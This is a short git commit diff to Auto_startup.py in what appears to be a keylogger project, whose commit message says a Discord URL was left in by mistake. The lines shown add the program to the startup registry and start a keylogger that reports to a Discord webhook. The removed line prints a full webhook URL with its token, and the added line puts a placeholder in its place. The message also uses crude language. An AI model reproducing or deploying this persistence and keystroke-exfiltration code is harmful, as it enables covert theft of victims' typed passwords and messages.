01345fa6c85686ea46694f122d0e9bbd814bc952
shushank <shushankpawar664@gmail.com>
2025-04-03 12:33:38 +0530

    Update Auto_startup.py
    hey bro you forget to remove that fucking url of discord

--- Auto_startup.py
+++ Auto_startup.py
@@ -166,6 +166,6 @@ if __name__ == "__main__":
     add_to_startup_registry()
 
     # Start the keylogger
-    webhook_url = "https://discord.com/api/webhooks/1355216328000147518/roTzaF_CSKbMcOpD0pETxOuWlt8jQKNWE1b39g8sKC70GG43S6zo3t3cFtGS5N0XHGyb"
+    webhook_url = "The_url_of_discord_intigration_stuff"
     keylogger = KeyLogger(webhook_url)
     keylogger.run()
